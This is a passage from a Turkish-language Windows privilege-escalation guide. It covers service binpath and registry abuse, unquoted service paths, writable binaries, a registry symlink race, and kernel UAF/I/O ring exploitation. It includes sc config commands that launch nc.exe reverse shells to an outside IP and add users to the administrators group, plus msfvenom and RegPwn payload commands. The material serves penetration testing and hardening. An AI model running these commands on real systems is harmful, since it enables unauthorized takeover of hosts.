_Hizmet başlatılamıyor; hizmet devre dışı bırakılmış veya hizmetle ilişkili etkin bir aygıt yok._

Şunu kullanarak etkinleştirebilirsiniz:

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**upnphost hizmetinin çalışması için SSDPSRV'ye bağlı olduğunu göz önünde bulundurun (XP SP1 için)**

**Bu soruna yönelik başka bir geçici çözüm** şunu çalıştırmaktır:

```
sc.exe config usosvc start= auto
```

### **Servis ikili dosya yolunu değiştirme**

"Authenticated users" grubunun bir hizmette **SERVICE_ALL_ACCESS** yetkisine sahip olduğu senaryoda, hizmetin yürütülebilir ikili dosyasını değiştirmek mümkündür. **sc**'yi değiştirmek ve çalıştırmak için:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Hizmeti yeniden başlat

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Yetkiler çeşitli izinler aracılığıyla yükseltilebilir:

- **SERVICE_CHANGE_CONFIG**: Hizmet ikilisinin yeniden yapılandırılmasına olanak tanır.
- **WRITE_DAC**: İzinlerin yeniden yapılandırılmasını sağlar ve hizmet yapılandırmalarının değiştirilmesine imkân verir.
- **WRITE_OWNER**: Sahipliğin alınmasına ve izinlerin yeniden yapılandırılmasına olanak tanır.
- **GENERIC_WRITE**: Hizmet yapılandırmalarını değiştirme yetkisini devralır.
- **GENERIC_ALL**: Hizmet yapılandırmalarını değiştirme yetkisini de devralır.

Bu açığın tespiti ve exploitation işlemleri için _exploit/windows/local/service_permissions_ kullanılabilir.

### Hizmet ikililerinde zayıf izinler

Bir hizmet **`LocalSystem`**, **`LocalService`**, **`NetworkService`** veya ayrıcalıklı bir domain hesabı olarak çalışıyorsa, ancak **düşük ayrıcalıklı kullanıcılar hizmet EXE dosyasını veya üst klasörünü değiştirebiliyorsa**, bu hizmet çoğu zaman **ikili dosya değiştirilip hizmet yeniden başlatılarak ele geçirilebilir**.

Bir hizmet tarafından çalıştırılan ikili dosyayı değiştirip değiştiremeyeceğinizi veya ikili dosyanın bulunduğu klasörde **yazma izinlerinizin** olup olmadığını kontrol edin ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Bir hizmet tarafından çalıştırılan tüm ikili dosyaları **wmic** (system32 içinde değildir) kullanarak listeleyebilir ve izinlerinizi **icacls** ile kontrol edebilirsiniz:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Ayrıca **sc** ve **icacls** kullanabilirsiniz:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

**`Everyone`**, **`BUILTIN\Users`** veya **`Authenticated Users`** gruplarına verilmiş tehlikeli ACL'leri, özellikle hizmet yürütülebilir dosyasında veya bu dosyayı içeren dizinde **`(F)`**, **`(M)`** ya da **`(W)`** izinlerini arayın. Uygulanabilir bir kötüye kullanım akışı şöyledir:<sup>[[27]](#references)</sup>

1. `sc qc <service_name>` komutuyla hizmet hesabını ve yürütülebilir dosya yolunu doğrulayın.
2. `icacls <path>` komutuyla ikili dosyanın yazılabilir olduğunu doğrulayın.
3. Hizmet ikili dosyasını bir payload veya geçerli, kötü amaçlı bir hizmet ikili dosyasıyla değiştirin.
4. `sc stop <service_name> && sc start <service_name>` komutuyla hizmeti yeniden başlatın (veya yeniden başlatmayı / hizmet tetikleyicisini bekleyin).

Kullanışlı otomatik kontroller:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Hizmet normal bir kullanıcının onu yeniden başlatmasına izin vermiyorsa, açılışta otomatik olarak başlayıp başlamadığını, hata eyleminin hizmeti yeniden başlatıp başlatmadığını veya hizmeti kullanan uygulamanın onu dolaylı olarak tetikleyip tetikleyemediğini kontrol edin.

### Hizmet kayıt defteri değiştirme izinleri

Herhangi bir hizmet kayıt defterini değiştirip değiştiremeyeceğinizi kontrol etmelisiniz.\
Bir hizmet **kayıt defteri** üzerindeki **izinlerinizi** şu şekilde **kontrol** edebilirsiniz:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Orijinal izin testi şöyle ifade edilmişti:

**Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** gruplarının `FullControl` izinlerine sahip olup olmadığı kontrol edilmelidir. Sahiplerse, hizmet tarafından çalıştırılan binary değiştirilebilir.

Belirli bir hizmet anahtarında **Authenticated Users** veya **NT AUTHORITY\INTERACTIVE** gruplarının yazma yetkisi veren registry izinlerine sahip olup olmadığını inceleyin. Tek başına bir ACL girdisi, etkin erişimi kanıtlamaz: deny girdileri, geçerli token ve devralınan izinler önemlidir. Registry anahtarı izinleri, hizmet nesnesinin `SERVICE_CHANGE_CONFIG` ve `SERVICE_START` izinlerinden ayrıdır. Privilege escalation için ayrıca kullanılabilir bir hizmet yapılandırma alanı, hizmeti tetikleme yöntemi ve daha ayrıcalıklı bir hizmet kimliği gerekir. Microsoft'un [registry-key rights](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-key-security-and-access-rights) ve [service access-rights reference](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) sayfalarına bakın.

Çalıştırılan binary'nin Path değerini değiştirmek için:

```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```

### Registry symlink race ile rastgele HKLM değer yazma (ATConfig)

Bazı Windows Accessibility özellikleri, daha sonra bir **SYSTEM** işlemi tarafından HKLM oturum anahtarına kopyalanan kullanıcı başına **ATConfig** anahtarları oluşturur. Bir registry **symbolic link race**, ayrıcalıklı yazma işlemini **herhangi bir HKLM yoluna** yönlendirerek rastgele HKLM **değer yazma** olanağı sağlar.<sup>[[18]](#references)</sup>

Anahtar konumları (örnek: Ekran Klavyesi `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs`, yüklü accessibility özelliklerini listeler.
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>`, kullanıcı denetimindeki yapılandırmayı depolar.
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>`, oturum açma/güvenli masaüstü geçişleri sırasında oluşturulur ve kullanıcı tarafından yazılabilir.

Kötüye kullanım akışı (CVE-2026-24291 / ATConfig):

1. SYSTEM tarafından yazılmasını istediğiniz **HKCU ATConfig** değerini ayarlayın.
2. AT broker akışını başlatan güvenli masaüstü kopyalama işlemini tetikleyin (ör. **LockWorkstation**).
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` üzerine bir **oplock** koyarak **race’i kazanın**; oplock tetiklendiğinde **HKLM Session ATConfig** anahtarını, korumalı bir HKLM hedefine işaret eden bir **registry link** ile değiştirin.
4. SYSTEM, saldırganın seçtiği değeri yönlendirilmiş HKLM yoluna yazar.

Rastgele HKLM değer yazma elde ettikten sonra, hizmet yapılandırma değerlerini üzerine yazarak LPE’ye geçin:

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath` (EXE/komut satırı)
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll` (DLL)

Normal bir kullanıcının başlatabildiği bir hizmet seçin (ör. **`msiserver`**) ve yazma işleminden sonra tetikleyin. **Not:** herkese açık exploit uygulaması, race’in bir parçası olarak iş istasyonunu kilitler.

Örnek araçlar (RegPwn BOF / bağımsız):<sup>[[19]](#references)</sup>

```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```

### Services registry AppendData/AddSubdirectory permissions

Bir registry üzerinde bu izne sahipseniz, **bu registry altında alt registry'ler oluşturabilirsiniz**. Windows services söz konusu olduğunda, **arbitrary code çalıştırmak için bu izin yeterlidir:**


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

Bir executable'ın yolu tırnak içine alınmamışsa, Windows boşluklardan önce biten her yolu çalıştırmayı dener.

Örneğin, _C:\Program Files\Some Folder\Service.exe_ yolu için Windows şunları çalıştırmayı dener:

```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```

Yerleşik Windows hizmetlerine ait olanlar hariç, tırnak içine alınmamış tüm hizmet yollarını listele:

```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
	for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
		echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
	)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```

**Bu güvenlik açığını metasploit ile tespit edip istismar edebilirsiniz**: `exploit/windows/local/trusted\_service\_path` Metasploit ile manuel olarak bir service binary oluşturabilirsiniz:

```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```

### Kurtarma Eylemleri

Windows, kullanıcıların bir hizmet başarısız olduğunda gerçekleştirilecek eylemleri belirtmesine olanak tanır. Bu özellik bir ikili dosyayı işaret edecek şekilde yapılandırılabilir. Bu ikili dosya değiştirilebiliyorsa ayrıcalık yükseltme mümkün olabilir. Daha fazla ayrıntı için [resmi belgelere](<https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc753662(v=ws.11)?redirectedfrom=MSDN>) bakın.

## Zamanlanmış görev betiği hedefleri

`.bat` veya `.cmd` dosyasıyla `cmd.exe /c` çalıştıran etkin bir görev için, `cmd.exe`'nin yanı sıra **eylem bağımsız değişkenlerinde** belirtilen betiği de kontrol edin. Aynı durum, PowerShell `-File` gibi bir yorumlayıcının açıkça belirtilen dosya bağımsız değişkeni için de geçerlidir. Zamanlanmış bir toplu iş dosyası, doğrudan bir PowerShell `-File` çağrısı içeriyorsa, başvurulan betiğin ACL'sini de inceleyin; değişkenlerin, koşullu ifadelerin ve kabuk zincirlemesinin elle izlenmesi gerekir. Çağıranın yazabildiği bir betik veya üst dizin, yalnızca yapılandırılmış görev sorumlusu çağırandan farklıysa ve görev gerçekten o eyleme ulaşıyorsa hesaplar arası yürütme için bir ipucudur. Yalnızca sona eklemeye izin veren bir ACL betikler için önemli olabilir; ancak daha önceki bir `exit` veya başka bir denetim akışı, eklenen satırların erişilemez olmasına yol açabilir. Ayrıcalık yükseltmesi olduğunu ileri sürmeden önce etkin ACL'leri, [görev yürütme bağlamını](https://learn.microsoft.com/en-us/windows/win32/taskschd/security-contexts-for-running-tasks), çalışma dizinini, tetikleyiciyi ve uygulama denetimi politikasını doğrulayın. Envanter çıkarma işlemi betiği değiştirmemeli veya görevi başlatmamalıdır.

## Erişilebilir dosyalardaki adlandırılmış akışlar

NTFS'de okunabilir bir dosyanın, içeriği sıradan bir dizin listesinde gösterilmeyen, adlandırılmış bir `:$DATA` akışı olabilir. Erişilebilir yedekleme veya yapılandırma dosyalarından oluşan küçük ve ilgili bir küme için, herhangi bir içeriği açmadan önce akış **adlarını ve boyutlarını** inceleyin; Windows bunları [`FindFirstStreamW` / `FindNextStreamW`](https://learn.microsoft.com/en-us/windows/win32/fileio/file-streams) ve PowerShell'in [`Get-Item -Stream *`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-item) komutlarıyla sunar. Gizli bir bilgiye işaret eden akış adı yalnızca bir ipucudur. Dosyanın etkin okuma erişimini, dosya sisteminin akış desteğini, akışın kullanılabilir kimlik bilgileri içerip içermediğini ve bu kimlik bilgilerinin gerçekte hangi hesapla kimlik doğruladığını kontrol edin. Rutin envanter çıkarma sırasında özyinelemeli akış taramalarından ve akış içeriklerini yazdırmaktan kaçının.

## Zamanlanmış Windows Driver Kit yardımcı aracı girdileri

İsteğe bağlı Windows Driver Kit, çalıştırıldığı dizindeki `command.txt`, `reboot.rsf` ve proje `working\rsf.rsf` dosyasını kullanabilen `StandaloneRunner.exe` içerir. Ayrıcalıklı bir hesapla bu yardımcı aracı başlatan bir zamanlanmış görev veya hizmet, yardımcı aracın yürütülebilir dosyası korumalı olsa bile bu girdilere düşük ayrıcalıklı yazma erişimini o hesabın bağlamında komut yürütmeye dönüştürebilir. Ayrıcalıklı tüketiciyi ve **her iki** ek dosyanın oluşturulabildiğini veya değiştirilebildiğini doğrulayın; yalnızca yardımcı aracı bulmak yeterli değildir.

Zamanlanmış bir görev için, görev eyleminin [`WorkingDirectory`](https://learn.microsoft.com/en-us/windows/win32/taskschd/execaction-workingdirectory) ayarını ve iki ek dosya yolunun ACL'lerini inceleyin. Görev bir çalışma dizini belirtmiyorsa, yürütülebilir dosyanın bulunduğu dizin, görevin girdilerini nereden okuduğunu doğrulamak için yalnızca bir ipucudur; kanıt değildir. Proje çalışma dosyası ön koşulu da karşılanmalıdır. Görevin SYSTEM olarak çalıştığını varsaymak yerine gerçek görev sorumlusunu kontrol edin.

## Uygulamalar

### Yüklü Uygulamalar

**İkili dosyaların izinlerini** (birini üzerine yazıp ayrıcalıkları yükseltebilirsiniz) ve **klasörlerin izinlerini** kontrol edin ([DLL Hijacking](dll-hijacking/index.html)).

```bash
dir /a "C:\Program Files"
dir /a "C:\Program Files (x86)"
reg query HKEY_LOCAL_MACHINE\SOFTWARE

Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime
Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name
```

#### Checkmk Windows agent repair path

[CVE-2024-0670](https://checkmk.com/werk/16361), komut dosyalarını `C:\Windows\Temp` dizinine yazan ve dosyanın üzerine yazma işlemi başarısız olduğunda önceden mevcut, yazmaya karşı korumalı bir dosyayı çalıştıran eski Checkmk Windows agent sürümlerini etkiler. Üretici sorunu 2.1.0p40, 2.2.0p23, 2.3.0b1 ve 2.4.0b1 sürümlerinde düzeltti. Yüklü sürümün tam yama düzeyini ve etkilenen agent işleminin çalışıp çalışamayacağını kontrol edin; yalnızca `2.1` gibi bir dal etiketi, etkilenme durumunu belirlemek için yeterli değildir. Enumeration; dosya oluşturmadan veya agent komutlarını tetiklemeden sürümü, hizmet durumunu ve Temp izinlerini inceleyebilir.

#### ADSelfService Plus SAML service review

[CVE-2022-47966](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html), ADSelfService Plus'ın 6210 ve önceki build'lerini etkiledi; üretici sorunu 6211 build'inde düzeltti. Bu güvenlik açığı yalnızca SAML SSO **etkinse veya geçmişte etkin olmuşsa** önemlidir. Bu nedenle, yüklü ürün kaydı veya hizmet yolu bir ipucudur; güvenlik açığının varlığını kanıtlamaz: tam build'i, SAML yapılandırma geçmişini, hizmete ağdan erişilebilir olup olmadığını ve hizmetin hangi hesapla çalıştığını doğrulayın. Hizmet üzerinden kod yürütme, o hesabın ayrıcalıklarını devralır; SYSTEM olarak yürütme için örneğin SYSTEM hesabıyla çalışması gerekir. Ürünün Backup dizininde okunabilir bir `OfflineBackup_*.ezip` dosyası, ayrı bir şifrelenmiş yedekleme ipucudur; kullanılabilir kimlik bilgisi ya da bu SAML güvenlik açığının kanıtı değildir. Rutin enumeration sırasında dosyayı açmadan yolunu ve erişim haklarını kaydedin.

#### Jenkins controller and domain-account boundaries

Bir Windows Jenkins controller'ında, job oluşturma veya yapılandırma iznini job'ı başlatma izninden ayırın: [Jenkins bunları ayrı `Job/Create`, `Job/Configure` ve `Job/Build` hakları olarak belgeliyor](https://www.jenkins.io/doc/book/security/access-control/permissions/). Yapılandırılmış bir zamanlama veya uzak tetikleyici başka bir build yolu sağlayabilir; ancak bunun etkin olduğunu ve build'in gerçekten çalıştığını doğrulayın. Yürütme, controller'ın veya seçili agent'ın kimliğiyle gerçekleşir; kayıtlı bir kimlik bilgisi yalnızca job'ın kapsamına erişebildiği takdirde kullanılabilir. Ayrıca `JENKINS_HOME` içindeki metadata'ya erişimi inceleyin: Jenkins, kimlik bilgisi materyallerini ve şifreleme anahtarlarını `credentials.xml`, `secrets/hudson.util.Secret` ve `secrets/master.key` dosyalarında tutar ([Jenkins secret storage](https://www.jenkins.io/doc/developer/security/secrets/)). Bu dosyaların mevcut olması tek başına parolayı açığa çıkarmaz; **gerekli dosyalara okuma erişimini** ve ayrı bir hesap yeniden kullanım yolunu doğrulayın; paylaşılan çıktılarda sırları yazdırmayın. Hesabın bir AD kullanıcı nesnesindeki `scriptPath` için yazma hakkı varsa, bunu kullanıcılar arası yürütme olarak değerlendirmeden önce yazılabilir bir script path olduğunu ve hedef kullanıcı olarak çalışan gerçek bir oturum açma ya da zamanlanmış tüketici bulunduğunu doğrulayın. Daha ileri grup denetimi için etkin AD hakları ayrıca doğrulanmalıdır.

#### Azure Pipelines self-hosted agent identity

Azure DevOps Server veya Azure Pipelines projesinde, pipeline **oluşturma veya düzenleme** iznini onu **kuyruğa alma** ve seçili agent pool'u kullanma izninden ayırın; [Microsoft pipeline izinlerini](https://learn.microsoft.com/en-us/azure/devops/pipelines/policies/permissions?view=azure-devops) ve [pool yetkilendirmesini](https://learn.microsoft.com/en-us/azure/devops/pipelines/agents/pools-queues?view=azure-devops) ayrı ayrı belgeliyor. Daha düşük ayrıcalıklı bir hesap script adımı gönderebiliyor ve bu pipeline'ı self-hosted bir Windows agent üzerinde çalıştırabiliyorsa, adım [agent'ın yapılandırılmış işletim sistemi hesabıyla](https://learn.microsoft.com/azure/devops/pipelines/agents/agents) yürütülür. Kullanıcılar arası veya SYSTEM geçişi olduğunu öne sürmeden önce tam pipeline'ı, branch/kaynak kısıtlamalarını, yetkilendirilmiş pool'u, çalıştırılabilir job'ı ve agent hizmetinin kimliğini doğrulayın. Yüklü bir agent, proje rolü veya repository yazma izni tek başına yalnızca bir ipucudur; pasif enumeration sırasında build başlatmadan izinleri ve yerel hizmet metadata'sını inceleyin.

#### Microsoft Entra Connect Sync credentials

[Microsoft,](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/reference-connect-accounts-permissions) eşitleme hizmetini çalıştıran ve SQL veritabanına erişen **ADSync hizmet hesabını**, dizin izinleri yapılandırılan eşitleme özelliklerine bağlı olan **AD DS connector hesabından** ayırır. Connector kimlik bilgileri bu veritabanında şifrelenmiş olarak saklanır; anahtar materyali [ADSync hizmet hesabı altında DPAPI ile korunur](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/concept-adsync-service-account). Yüklü bir eşitleme hizmeti, yerel yönetici izlenimi veren bir grup veya veritabanının görünür olması tek başına çözülebilir bir kimlik bilgisini ya da domain ayrıcalığı yükseltmesini kanıtlamaz. Veritabanının gerçek okuma haklarını, hizmet hesabı/anahtar erişimini, kurulum ve SQL düzenini, yapılandırılmış connector kimliğini ve bu kimliğin etkin AD ayrıcalıklarını ayrı ayrı inceleyin. Rutin enumeration yalnızca hizmet ve erişim metadata'sını göstermeli; saklanan sırları sorgulamamalı veya yazdırmamalıdır.

#### Printer driver support DLL permissions

Yüklü bir printer driver, destek DLL'lerini `C:\ProgramData` altında tutabilir ve bunları daha ayrıcalıklı bir print process içinde yükleyebilir. Printer WMI enumeration engellense bile üst dizinleri ve reparse point'leri dahil olmak üzere ilgili driver dizininin ve DLL'lerin ACL'lerini inceleyin. [Ricoh printer-driver sorunu CVE-2019-19363](https://www.ricoh.com/info/2020/0122_1) için bildirilen yol `C:\ProgramData\RICOH_DRV\<driver>\_common\dlz` idi; [orijinal açıklama](https://www.pentagrid.ch/de/blog/local-privilege-escalation-in-ricoh-printer-drivers-for-windows-cve-2019-19363/) DLL'lerin `PrintIsolationHost.exe` tarafından yüklendiğini belirtiyor. Yazılabilir bir ACL yalnızca bir ipucudur: reddetme girdileri uygulandıktan sonra etkin yazma erişimini, ilgili driver'ın yüklü olduğunu ve dosyayı ayrıcalıklı bir kimlikle yüklediğini, ayrıca üreticinin güncellenmiş driver'ının veya güvenlik programının bu kurulumdaki sorunu giderip gidermediğini doğrulayın. Yalnızca dizin adına veya driver sürümüne bakarak güvenlik açığı olduğu sonucuna varmayın.

### Yazma İzinleri

Özel bir dosyayı okumak için bazı yapılandırma dosyalarını değiştirip değiştiremeyeceğinizi ya da Yönetici hesabıyla yürütülecek bir binary'yi (schedtasks) değiştirip değiştiremeyeceğinizi kontrol edin.

Sistemdeki zayıf klasör/dosya izinlerini bulmanın bir yolu şudur:

```bash
accesschk.exe /accepteula
# Find all weak folder permissions per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwdqs "Everyone" c:\
# Find all weak file permissions per drive.
accesschk.exe -uwqs Users c:\*.*
accesschk.exe -uwqs "Authenticated Users" c:\*.*
accesschk.exe -uwdqs "Everyone" c:\*.*
```

```bash
icacls "C:\Program Files\*" 2>nul | findstr "(F) (M) :\" | findstr ":\ everyone authenticated users todos %username%"
icacls ":\Program Files (x86)\*" 2>nul | findstr "(F) (M) C:\" | findstr ":\ everyone authenticated users todos %username%"
```

```bash
Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}}

Get-ChildItem 'C:\Program Files\*','C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}}
```

### Notepad++ plugin autoload kalıcılığı/çalıştırma

Notepad++ `plugins` alt klasörlerindeki tüm plugin DLL'lerini otomatik yükler. Yazılabilir bir portable/kopya kurulum varsa, kötü amaçlı bir plugin bırakmak her başlatmada `notepad++.exe` içinde otomatik kod çalıştırılmasını sağlar (`DllMain` ve plugin callback'leri dahil).

{{#ref}}
notepad-plus-plus-plugin-autoload-persistence.md
{{#endref}}

### Başlangıçta çalıştırma

**Farklı bir kullanıcı tarafından çalıştırılacak bir kayıt defteri girdisinin veya binary'nin üzerine yazıp yazamayacağınızı kontrol edin.**\
**Yetkileri yükseltmek için ilgi çekici autoruns konumları** hakkında daha fazla bilgi edinmek için **aşağıdaki sayfayı okuyun**:


{{#ref}}
privilege-escalation-with-autorun-binaries.md
{{#endref}}

### Sürücüler

Olası **üçüncü taraf tuhaf/açık barındıran** sürücüleri arayın

```bash
driverquery
driverquery.exe /fo table
driverquery /SI
```

Bir driver keyfi kernel read/write primitive sunuyorsa (kötü tasarlanmış IOCTL handler'larında yaygındır), kernel memory içinden doğrudan bir SYSTEM token çalarak yetki yükseltebilirsiniz.<sup>[[13]](#references)</sup> Adım adım tekniği burada görebilirsiniz:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

{{#ref}}
windows-kernel-rootkits-and-dkom.md
{{#endref}}

{{#ref}}
kernel-mode-file-access-check-bypass.md
{{#endref}}

Windows kernel exploitation ile ilgili materyaller:

User-writable read/write register'ları olan bir kernel-mode ring-buffer örneği için [USB MIDI looped-streaming varyantına](../../binary-exploitation/array-indexing.md#kernel-driver-variant-usb-midi-looped-streaming) bakın.

{{#ref}}
../../binary-exploitation/windows-kernel-type-confusion-to-npfs-arbitrary-rw.md
{{#endref}}

Savunmasız çağrının saldırganın kontrolündeki bir Object Manager path'ini açtığı race-condition bug'larında, lookup işlemini kasıtlı olarak yavaşlatmak (max-length bileşenler veya derin directory zincirleri kullanarak) zaman aralığını mikrosaniyelerden onlarca mikrosaniyeye çıkarabilir:

{{#ref}}
kernel-race-condition-object-manager-slowdown.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/afd-rio-buffer-uaf.md
{{#endref}}

{{#ref}}
../../binary-exploitation/windows-kernel-exploitation/usb-midi-packet-size-pool-overflow.md
{{#endref}}

#### Cancel-safe queue UAF'leri, paged-pool disclosure'ları ve I/O ring pivot'ları

Bazı Windows kernel LPE zincirleri, tek başlarına zayıf olan iki bug kullanılarak oluşturulabilir: queue lock hâlâ tutulurken bir request/CBD'yi serbest bırakan bir **cancel-safe queue lifetime race** ve `RtlCopyToUser` sırasında serbest bırakılmış bir paged-pool allocation'ı sızdıran bir **lock-release-before-copy disclosure**.<sup>[[29]](#references)</sup>

Audit ve exploitation notları:

- **Free-under-lock + cancel afterwards**: success path'in **Acquire -> CompleteRequest/free -> Release** yaptığı, cancel path'in ise **Acquire -> RemoveIo(stale pointer) -> Release -> CompleteCanceledIo** yaptığı bir akış arayın. Success path, CBDQ/CSQ lock'unu bırakmadan önce `FltCompletePendedPreOperation` / `FltpFreeIrpCtrl`'a ulaşırsa, `NtCancelIoFileEx -> IopCsqCancelRoutine` içinde bekleyen bir thread daha sonra devam edip serbest bırakılmış bir `PFLT_CALLBACK_DATA`'yı driver'ın remove callback'ine geçirebilir.
- Serbest bırakılan queue object'ini aynı boyutta, saldırganın kontrolündeki bir paged-pool allocation'ıyla **yeniden tahsis edin**. `NPFS` Data Queue Entries, payload ve boyut kontrol edilebildiği ve daha sonra pipe read/peek işlemleriyle yoklanabildiği için kullanışlıdır. Serbest bırakılan object list link'leri içeriyorsa bunları **user memory'deki sahte request node'larından oluşan döngüsel bir listeyle** üzerine yazın; böylece driver, özgün liste başlığında durmak yerine saldırganın tanımladığı request structure'larını tekrar tekrar işler.
- **Öngörülebilir bir write'ı yükseltin**: sahte request, bookkeeping write'larında kullanılan iç içe bir context pointer'ını (timestamps / QPC / refcount-adjacent fields) yönlendiriyorsa, **adresi kontrol edilebilen ancak değeri kontrol edilemeyen** bir kernel write elde edebilirsiniz. Bu durumda nihai bir code/data pointer yerine sprayed pool object'in **length/size** alanını hedefleyin, ardından bozulmuş object'in **out-of-bounds paged-pool read** sağlamasını bulana kadar spray'i tarayın.
- **Raceable disclosure pattern**: `ptr = obj->Buffer; unlock(obj); RtlCopyToUser(dst, ptr, size)` işlemini yapan herhangi bir syscall güçlü bir adaydır. Saldırgan kopyalanan buffer'ı büyütebiliyorsa (örneğin serializer'ın son allocation boyutunu artıran çok sayıda list/resource entry ekleyerek) güvenilirlik artar; çünkü daha uzun bir kopyalama, makineyi çökertmeden replacement window'ı genişletir.
- **Pointer-rich refill targets**: Windows **I/O ring** registered-buffer array'leri, paged-pool boyutları saldırgan tarafından kontrol edilebildiği (`8 * regBufferCnt`) ve her eleman bir `_IOP_MC_BUFFER_ENTRY` için kernel pointer'ı olduğu için mükemmel disclosure hedefleridir. Bu array'lerden birini leak edin, çevresindeki `IORING_OBJECT`'i bulun, ardından sonraki I/O ring işlemlerinin saldırganın oluşturduğu entry'leri kullanıp keyfi kernel read/write sağlaması için **`RegBuffers`** ve **`RegBuffersCount`** alanlarını bozun. Kullanılabilen tek write size kararlı bir byte ise (örneğin `KUSER_SHARED_DATA+0x14` üzerinden), `0x0101010101010101` gibi tekrarlanan byte'lardan oluşan bir user pointer oluşturmak için **overlapping unaligned write'lar** kullanın, bunu `VirtualAlloc` ile map edin ve sahte registered-buffer array'ini bu adrese yerleştirin.<sup>[[30]](#references)</sup>

Faydalı debugging göstergeleri:

```text
NtCancelIoFileEx -> IopCsqCancelRoutine -> <driver>!RemoveIo
<driver> success path: Acquire -> CompleteRequest/free -> Release
RtlCopyToUser after releasing the object lock
ExAllocatePool2(..., 8 * regBufferCnt, 'BRrI')-style variable-sized pointer arrays
```

Bozuk I/O ring üzerinden kernel üzerinde keyfi okuma/yazma elde ettikten sonra, standart primitive sonrası iş akışını kullanarak bir SYSTEM token çalın:

{{#ref}}
arbitrary-kernel-rw-token-theft.md
{{#endref}}

#### Registry hive bellek bozulması primitive'leri

